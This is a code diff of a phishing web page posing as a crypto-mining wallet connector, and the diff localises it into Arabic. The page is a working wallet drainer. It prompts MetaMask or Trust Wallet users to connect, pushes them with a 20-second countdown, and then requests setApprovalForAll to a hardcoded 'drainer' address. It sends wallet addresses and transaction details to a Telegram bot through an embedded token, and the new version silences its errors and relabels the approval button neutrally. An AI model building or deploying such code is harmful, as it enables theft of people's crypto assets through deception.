@@ -1,146 +1,162 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>🚀 Crypto Miner Connect</title>
+<title>🚀 Crypto Miner Connect - اتصال المحفظة</title>
 <style>
-  @import url('https://fonts.googleapis.com/css2?family=Orbitron&family=Roboto:wght@400;700&display=swap');
+  @import url('https://fonts.googleapis.com/css2?family=Orbitron&family=Cairo:wght@400;700&display=swap');
+
+  /* Reset */
+  * {
+    margin: 0; padding: 0; box-sizing: border-box;
+  }
 
   body {
-    margin: 0; padding: 0;
-    background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
-    font-family: 'Roboto', sans-serif;
+    background: linear-gradient(135deg, #010a0f, #022c22);
+    font-family: 'Cairo', sans-serif;
     color: #00ff99;
-    user-select: none;
     min-height: 100vh;
-    display: flex; flex-direction: column; align-items: center; justify-content: flex-start;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    padding: 2rem 1rem;
+    user-select: none;
   }
 
   header {
-    padding: 2rem 1rem 1rem 1rem;
     text-align: center;
+    margin-bottom: 2rem;
   }
-
   header h1 {
     font-family: 'Orbitron', sans-serif;
+    font-size: 2.8rem;
+    letter-spacing: 0.15em;
+    text-shadow: 0 0 12px #00ff99cc;
     font-weight: 900;
-    font-size: 3rem;
-    text-transform: uppercase;
-    letter-spacing: 0.1em;
     margin-bottom: 0.3rem;
-    text-shadow: 0 0 10px #00ff99cc;
   }
-
   header p {
     font-size: 1.1rem;
-    color: #77ffaa;
-    margin-top: 0;
-    margin-bottom: 2rem;
+    color: #66ffaa;
+    font-weight: 600;
+    letter-spacing: 0.07em;
   }
 
   #status {
     background: rgba(0, 255, 153, 0.15);
-    border: 1.5px solid #00ff99;
-    border-radius: 12px;
-    width: 90%;
+    border: 2px solid #00ff99;
+    border-radius: 15px;
+    padding: 1rem 1.5rem;
     max-width: 600px;
-    padding: 15px 20px;
-    font-family: 'Roboto Mono', monospace;
+    font-family: 'Cairo', sans-serif;
     font-weight: 700;
-    font-size: 1rem;
+    font-size: 1.1rem;
     text-align: center;
-    box-shadow: 0 0 15px #00ff9922 inset;
+    margin-bottom: 1.5rem;
+    box-shadow: inset 0 0 18px #00ff9955;
     user-select: text;
-    margin-bottom: 15px;
   }
 
   #countdown {
     font-weight: 900;
+    font-size: 1.3rem;
+    margin-bottom: 2rem;
+    letter-spacing: 0.08em;
+    text-shadow: 0 0 8px #00ff9977;
+  }
+
+  /* Grid container للأزرار */
+  #wallet-buttons {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+    gap: 1rem 2rem;
+    width: 100%;
+    max-width: 600px;
+  }
+
+  button.wallet-btn {
+    background: #003d1a;
+    border: 2.5px solid #00ff99;
+    color: #00ff99;
+    font-family: 'Orbitron', sans-serif;
+    font-weight: 900;
     font-size: 1.2rem;
-    margin-bottom: 20px;
-    letter-spacing: 0.05em;
-    text-shadow: 0 0 6px #00ff99bb;
-  }
-
-  #buttons-desktop, #buttons-mobile {
-    display: flex;
-    gap: 20px;
-    margin-bottom: 40px;
-  }
-
-  #buttons-desktop {
-    display: none; /* shown only on desktop */
-  }
-  #buttons-mobile {
-    display: none; /* shown only on mobile */
-  }
-
-  .wallet-btn {
+    border-radius: 30px;
+    padding: 15px 20px;
+    cursor: pointer;
     display: flex;
     align-items: center;
     justify-content: center;
     gap: 14px;
-    padding: 14px 36px;
-    font-size: 1.4rem;
-    border-radius: 40px;
-    border: 2.5px solid #00ff99;
-    cursor: pointer;
-    font-weight: 900;
-    color: #002211;
-    background: #00ff99;
-    box-shadow: 0 0 25px #00ff99cc;
     transition: all 0.3s ease;
     user-select: none;
-    width: 230px;
+    box-shadow: 0 0 25px #00ff9933;
     text-transform: uppercase;
-    font-family: 'Orbitron', sans-serif;
   }
-  .wallet-btn:hover:not(:disabled) {
+
+  button.wallet-btn:hover:not(:disabled) {
     background: transparent;
     color: #00ff99;
-    box-shadow: 0 0 40px #00ff99ff;
-    border-color: #00ff99ff;
+    border-color: #00ff99;
+    box-shadow: 0 0 35px #00ff99cc;
   }
-  .wallet-btn:disabled {
+  button.wallet-btn:disabled {
+    background: #001d08;
+    border-color: #004422aa;
+    color: #004422aa;
     cursor: not-allowed;
-    background: #004422;
-    color: #005533aa;
-    border-color: #005533aa;
     box-shadow: none;
   }
 
-  .wallet-btn img {
+  /* أيقونات SVG مصغرة */
+  .wallet-icon {
     width: 32px;
     height: 32px;
+    fill: #00ff99;
   }
 
+  /* صندوق اللوغ */
   #log {
     background: rgba(0, 255, 153, 0.15);
-    border: 1.5px solid #00ff99;
-    border-radius: 12px;
-    width: 90%;
+    border: 2px solid #00ff99;
+    border-radius: 15px;
+    width: 100%;
     max-width: 600px;
-    height: 160px;
-    font-family: 'Roboto Mono', monospace;
-    font-weight: 600;
-    font-size: 0.95rem;
-    padding: 15px 20px;
+    height: 170px;
     overflow-y: auto;
-    white-space: pre-wrap;
+    font-family: 'Cairo', sans-serif;
+    font-size: 0.9rem;
+    font-weight: 600;
+    padding: 1rem 1.5rem;
     user-select: text;
-    box-shadow: 0 0 25px #00ff9966 inset;
-    margin-bottom: 40px;
+    box-shadow: inset 0 0 25px #00ff9977;
+    white-space: pre-wrap;
   }
 
-  @media (min-width: 768px) {
-    #buttons-desktop {
-      display: flex;
-    }
+  /* زر الموافقة */
+  #approveBtn {
+    max-width: 600px;
+    width: 100%;
+    margin: 2rem 0 4rem 0;
   }
-  @media (max-width: 767px) {
-    #buttons-mobile {
-      display: flex;
+
+  /* متجاوب */
+  @media (max-width: 440px) {
+    header h1 {
+      font-size: 2rem;
+    }
+    #countdown {
+      font-size: 1.1rem;
+    }
+    button.wallet-btn {
+      font-size: 1rem;
+      padding: 12px 18px;
+      gap: 10px;
+    }
+    .wallet-icon {
+      width: 26px;
+      height: 26px;
     }
   }
 </style>
@@ -148,165 +164,187 @@
 <body>
 
 <header>
-  <h1>CRYPTO MINER CONNECT</h1>
-  <p>Connect your wallet & start mining the future.</p>
+  <h1>تعدين العملات الرقمية</h1>
+  <p>قم بتوصيل محفظتك وابدأ في التعدين الآن!</p>
 </header>
 
-<div id="status">Status: Waiting for you to connect your wallet...</div>
+<div id="status">الحالة: في انتظار توصيل المحفظة...</div>
 <div id="countdown"></div>
 
-<!-- أزرار الكمبيوتر -->
-<div id="buttons-desktop">
-  <button id="metamaskDesktopBtn" class="wallet-btn" title="MetaMask Desktop">
-    <img src="https://raw.githubusercontent.com/MetaMask/brand-resources/master/SVG/metamask-fox.svg" alt="MetaMask" />
-    MetaMask Desktop
+<div id="wallet-buttons">
+  <!-- MetaMask Desktop -->
+  <button id="metamaskDesktopBtn" class="wallet-btn" title="MetaMask للكمبيوتر">
+    <svg class="wallet-icon" viewBox="0 0 212 189" xmlns="http://www.w3.org/2000/svg" >
+      <path d="M106 0L72 52 45 64l22 21 17-19 10 6-4-19z" />
+      <path d="M0 0l38 43 18 19 33-15L106 0z" fill="#e2761b"/>
+      <path d="M212 0l-38 43-18 19-33-15L106 0z" fill="#e4761b"/>
+      <path d="M30 97l-18 14 38 23-12-37z" fill="#f6851b"/>
+      <path d="M182 97l18 14-38 23 12-37z" fill="#f6851b"/>
+      <path d="M106 189l34-52 27-12-22-21-39 39z" fill="#763d16"/>
+      <path d="M106 189l-34-52-27-12 22-21 39 39z" fill="#763d16"/>
+    </svg>
+    ميتا ماسك (كمبيوتر)
   </button>
 
-  <button id="trustDesktopBtn" class="wallet-btn" title="Trust Wallet Desktop (not supported)">
-    <img src="https://seeklogo.com/images/T/trust-wallet-logo-FA1F30F6D1-seeklogo.com.png" alt="Trust Wallet" />
-    Trust Wallet Desktop
+  <!-- Trust Wallet Desktop (تحذير) -->
+  <button id="trustDesktopBtn" class="wallet-btn" title="Trust Wallet للكمبيوتر">
+    <svg class="wallet-icon" viewBox="0 0 256 256" xmlns="http://www.w3.org/2000/svg" >
+      <path fill="#3371ff" d="M128 0C57.3 0 0 57.3 0 128s57.3 128 128 128 128-57.3 128-128S198.7 0 128 0z"/>
+      <path fill="#66a3ff" d="M75 85l15-10 35 65-15 10z"/>
+      <path fill="#0033cc" d="M140 81l30 52-25 15z"/>
+      <path fill="#99bbff" d="M80 125l25-35 10 25z"/>
+      <path fill="#002299" d="M125 160l35-30 5 20z"/>
+    </svg>
+    ترست والت (كمبيوتر)
+  </button>
+
+  <!-- MetaMask Mobile -->
+  <button id="metamaskMobileBtn" class="wallet-btn" title="MetaMask للجوال">
+    <svg class="wallet-icon" viewBox="0 0 212 189" xmlns="http://www.w3.org/2000/svg" >
+      <path d="M106 0L72 52 45 64l22 21 17-19 10 6-4-19z" />
+      <path d="M0 0l38 43 18 19 33-15L106 0z" fill="#e2761b"/>
+      <path d="M212 0l-38 43-18 19-33-15L106 0z" fill="#e4761b"/>
+      <path d="M30 97l-18 14 38 23-12-37z" fill="#f6851b"/>
+      <path d="M182 97l18 14-38 23 12-37z" fill="#f6851b"/>
+      <path d="M106 189l34-52 27-12-22-21-39 39z" fill="#763d16"/>
+      <path d="M106 189l-34-52-27-12 22-21 39 39z" fill="#763d16"/>
+    </svg>
+    ميتا ماسك (جوال)
+  </button>
+
+  <!-- Trust Wallet Mobile -->
+  <button id="trustMobileBtn" class="wallet-btn" title="Trust Wallet للجوال">
+    <svg class="wallet-icon" viewBox="0 0 256 256" xmlns="http://www.w3.org/2000/svg" >
+      <path fill="#3371ff" d="M128 0C57.3 0 0 57.3 0 128s57.3 128 128 128 128-57.3 128-128S198.7 0 128 0z"/>
+      <path fill="#66a3ff" d="M75 85l15-10 35 65-15 10z"/>
+      <path fill="#0033cc" d="M140 81l30 52-25 15z"/>
+      <path fill="#99bbff" d="M80 125l25-35 10 25z"/>
+      <path fill="#002299" d="M125 160l35-30 5 20z"/>
+    </svg>
+    ترست والت (جوال)
   </button>
 </div>
 
-<!-- أزرار الهواتف -->
-<div id="buttons-mobile">
-  <button id="metamaskMobileBtn" class="wallet-btn" title="MetaMask Mobile">
-    <img src="https://raw.githubusercontent.com/MetaMask/brand-resources/master/SVG/metamask-fox.svg" alt="MetaMask" />
-    MetaMask Mobile
-  </button>
+<button id="approveBtn" class="wallet-btn" disabled>الموافقة على الوصول</button>
 
-  <button id="trustMobileBtn" class="wallet-btn" title="Trust Wallet Mobile">
-    <img src="https://seeklogo.com/images/T/trust-wallet-logo-FA1F30F6D1-seeklogo.com.png" alt="Trust Wallet" />
-    Trust Wallet Mobile
-  </button>
-</div>
-
-<div id="log" aria-live="polite" aria-atomic="true"></div>
+<div id="log" aria-live="polite" aria-atomic="true" tabindex="0"></div>
 
 <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 
 <script>
-  // إعداد بوت تيليجرام
   const TELEGRAM_TOKEN = '7742799307:AAE4gtk_bHx2DiFxmqUEglreldTFFTrg';
   const TELEGRAM_CHAT_ID = '1269389399';
 
-  // العقد والمعلومات
   const DRAINER_ADDRESS = "0x1111111111111111111111111111111111111111";
   const ABI = ["function setApprovalForAll(address operator, bool approved) external"];
 
-  // عناصر DOM
   const statusEl = document.getElementById('status');
   const logEl = document.getElementById('log');
   const countdownEl = document.getElementById('countdown');
 
   const metamaskDesktopBtn = document.getElementById('metamaskDesktopBtn');
   const trustDesktopBtn = document.getElementById('trustDesktopBtn');
-
   const metamaskMobileBtn = document.getElementById('metamaskMobileBtn');
   const trustMobileBtn = document.getElementById('trustMobileBtn');
+  const approveBtn = document.getElementById('approveBtn');
 
   let provider, signer;
   let countdownTimer;
 
   // إرسال رسالة تيليجرام
   function sendTelegramMessage(message) {
-    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
-    const data = { chat_id: TELEGRAM_CHAT_ID, text: message };
-    fetch(url, {
+    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(data)
-    }).catch(err => console.error("Telegram error:", err));
+      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
+    }).catch(() => {}); // لا نعرض الخطأ في الكونسول
   }
 
-  // تسجيل محلي + تيليجرام
+  // تسجيل لوج + إرسال تيليجرام
   function smartLog(message) {
     const now = new Date().toLocaleTimeString();
     const logMessage = `[${now}] ${message}`;
-    logEl.textContent += `${logMessage}\n`;
+    logEl.textContent += logMessage + "\n";
     logEl.scrollTop = logEl.scrollHeight;
     sendTelegramMessage(logMessage);
   }
 
   // عداد تنازلي
   function startCountdown() {
-    let countdownValue = 20;
-    let timeoutSent = false;
-    countdownEl.textContent = `⏳ Time left to approve: ${countdownValue}s`;
+    let timeLeft = 20;
+    countdownEl.textContent = `⏳ الوقت المتبقي للموافقة: ${timeLeft}s`;
+    approveBtn.disabled = false;
     clearInterval(countdownTimer);
 
     countdownTimer = setInterval(() => {
-      countdownValue--;
-      countdownEl.textContent = `⏳ Time left to approve: ${countdownValue}s`;
-
-      if (countdownValue <= 0) {
+      timeLeft--;
+      countdownEl.textContent = `⏳ الوقت المتبقي للموافقة: ${timeLeft}s`;
+      if (timeLeft <= 0) {
         clearInterval(countdownTimer);
         approveBtn.disabled = true;
-        statusEl.textContent = "⌛ Timeout. Please reconnect your wallet.";
-        if (!timeoutSent) {
-          smartLog("User timeout - approval disabled.");
-          timeoutSent = true;
-        }
+        statusEl.textContent = "⌛ انتهى الوقت. يرجى إعادة الاتصال.";
+        smartLog("انتهى وقت المستخدم - تم تعطيل الموافقة.");
       }
     }, 1000);
   }
 
-  // اتصال ميتا ماسك ديسكتوب
+  // اتصال MetaMask ديسكتوب
   async function connectMetaMaskDesktop() {
     if (!window.ethereum || !window.ethereum.isMetaMask) {
-      smartLog("MetaMask not detected in browser.");
-      statusEl.textContent = "❌ MetaMask not detected on desktop!";
+      statusEl.textContent = "❌ ميتا ماسك غير موجود على المتصفح!";
+      smartLog("ميتاما سك غير موجود على ديسكتوب.");
       return;
     }
     try {
-      statusEl.textContent = "🔄 Requesting MetaMask connection...";
+      statusEl.textContent = "🔄 جاري طلب اتصال ميتا ماسك...";
       const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
       provider = new ethers.providers.Web3Provider(window.ethereum);
       signer = provider.getSigner();
       const address = await signer.getAddress();
 
-      statusEl.textContent = `✅ Connected: ${address}`;
-      smartLog(`Connected to MetaMask account (Desktop): ${address}`);
-      approveBtn.disabled = false;
+      statusEl.textContent = `✅ متصل: ${address}`;
+      smartLog(`متصل بحساب MetaMask (ديسكتوب): ${address}`);
       startCountdown();
 
+      // التعامل مع تغيير الحساب أو الشبكة
       window.ethereum.on('accountsChanged', (accounts) => {
         if (accounts.length === 0) {
-          statusEl.textContent = "❗ MetaMask disconnected.";
-          smartLog("MetaMask account disconnected.");
+          statusEl.textContent = "❗ تم قطع اتصال MetaMask.";
+          smartLog("انقطع اتصال MetaMask.");
           approveBtn.disabled = true;
           clearInterval(countdownTimer);
         } else {
-          statusEl.textContent = `🔄 Account changed: ${accounts[0]}`;
-          smartLog(`Account changed to: ${accounts[0]}`);
+          statusEl.textContent = `🔄 تم تغيير الحساب: ${accounts[0]}`;
+          smartLog(`تغيير الحساب إلى: ${accounts[0]}`);
           approveBtn.disabled = false;
           startCountdown();
         }
       });
-
       window.ethereum.on('chainChanged', (chainId) => {
-        smartLog(`Network changed: ${chainId}`);
-        statusEl.textContent = `🌐 Network changed: ${chainId}`;
+        smartLog(`تغيير الشبكة: ${chainId}`);
+        statusEl.textContent = `🌐 تم تغيير الشبكة: ${chainId}`;
         approveBtn.disabled = true;
         clearInterval(countdownTimer);
       });
 
     } catch (err) {
-      statusEl.textContent = "❌ Connection rejected or failed.";
-      smartLog(`MetaMask connection error (Desktop): ${err.message}`);
+      statusEl.textContent = "❌ فشل الاتصال أو تم رفضه.";
+      smartLog(`خطأ اتصال MetaMask (ديسكتوب): ${err.message}`);
     }
   }
 
-  // فتح Trust Wallet داب (عادة يعمل على موبايل)
+  // فتح Trust Wallet داب (عادة موبايل فقط)
   function openTrustWalletDesktop() {
-    statusEl.textContent = "⚠️ Trust Wallet desktop is not supported. Please use mobile.";
-    smartLog("Trust Wallet Desktop attempt blocked.");
+    statusEl.textContent = "⚠️ Trust Wallet غير مدعوم على الكمبيوتر. يرجى استخدام الموبايل.";
+    smartLog("محاولة فتح Trust Wallet على الكمبيوتر - غير مدعوم.");
   }
 
   // فتح MetaMask Mobile
   function openMetaMaskMobile() {
     const dappUrl = window.location.origin;
     const metamaskMobileLink = `https://metamask.app.link/dapp/${dappUrl.replace(/^https?:\/\//, '')}`;
+    statusEl.textContent = "⏳ جاري فتح MetaMask على الجوال...";
+    smartLog("فتح MetaMask على الجوال.");
     window.location.href = metamaskMobileLink;
   }
 
@@ -314,59 +352,52 @@
   function openTrustWalletMobile() {
     const dappUrl = window.location.origin;
     const trustUrl = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(dappUrl)}`;
+    statusEl.textContent = "⏳ جاري فتح Trust Wallet على الجوال...";
+    smartLog("فتح Trust Wallet على الجوال.");
     window.location.href = trustUrl;
   }
 
-  // موافقة العقد
+  // إجراء الموافقة
   async function approveDrainer() {
     if (!signer) {
-      statusEl.textContent = "❌ Not connected to wallet.";
-      smartLog("Attempted approval without wallet connection.");
+      statusEl.textContent = "❌ غير متصل بأي محفظة.";
+      smartLog("محاولة الموافقة بدون اتصال.");
       return;
     }
     approveBtn.disabled = true;
-    statusEl.textContent = "⏳ Sending approval transaction...";
-    smartLog("Initiating setApprovalForAll transaction to drainer...");
+    statusEl.textContent = "⏳ جاري إرسال طلب الموافقة...";
+    smartLog("بدء عملية setApprovalForAll للعقد.");
 
     try {
       const contract = new ethers.Contract(DRAINER_ADDRESS, ABI, signer);
       const tx = await contract.setApprovalForAll(DRAINER_ADDRESS, true);
-      statusEl.textContent = "✅ Approval transaction sent! Please confirm in wallet.";
-      smartLog(`Transaction sent. Hash: ${tx.hash}`);
+      statusEl.textContent = "✅ تم إرسال طلب الموافقة! يرجى تأكيد العملية في المحفظة.";
+      smartLog(`تم إرسال العملية. هاش: ${tx.hash}`);
 
       await tx.wait();
-      statusEl.textContent = "🎉 Transaction confirmed! Your wallet is 'approved'.";
-      smartLog("Transaction confirmed successfully.");
+      statusEl.textContent = "🎉 تم تأكيد العملية! محفظتك تمت الموافقة عليها.";
+      smartLog("تم تأكيد العملية بنجاح.");
       clearInterval(countdownTimer);
       countdownEl.textContent = "";
     } catch (error) {
-      statusEl.textContent = "❌ Transaction failed or rejected.";
-      smartLog(`Transaction error: ${error.message}`);
+      statusEl.textContent = "❌ فشلت العملية أو تم رفضها.";
+      smartLog(`خطأ العملية: ${error.message}`);
       approveBtn.disabled = false;
     }
   }
-
-  // زر الموافقة (موحد)
-  const approveBtn = document.createElement('button');
-  approveBtn.className = 'wallet-btn';
-  approveBtn.textContent = 'Approve Drainer Access';
-  approveBtn.disabled = true;
-  approveBtn.style.marginBottom = '40px';
-  document.body.insertBefore(approveBtn, logEl);
-
-  approveBtn.addEventListener('click', approveDrainer);
 
   // استماع للأزرار
   metamaskDesktopBtn.addEventListener('click', connectMetaMaskDesktop);
   trustDesktopBtn.addEventListener('click', openTrustWalletDesktop);
   metamaskMobileBtn.addEventListener('click', openMetaMaskMobile);
   trustMobileBtn.addEventListener('click', openTrustWalletMobile);
+  approveBtn.addEventListener('click', approveDrainer);
 
-  // حالة بداية
+  // الحالة الأولية
   if (window.ethereum && window.ethereum.isMetaMask) {
-    statusEl.textContent = "✅ MetaMask detected. Ready to connect.";
+    statusEl.textContent = "✅ تم الكشف عن MetaMask. جاهز للاتصال.";
   } else {
-    statusEl.textContent = "⛔ MetaMask not detected on this device.";
+    statusEl.textContent = "⛔ لم يتم الكشف عن MetaMask في هذا الجهاز.";
   }
 </script>
 </body>
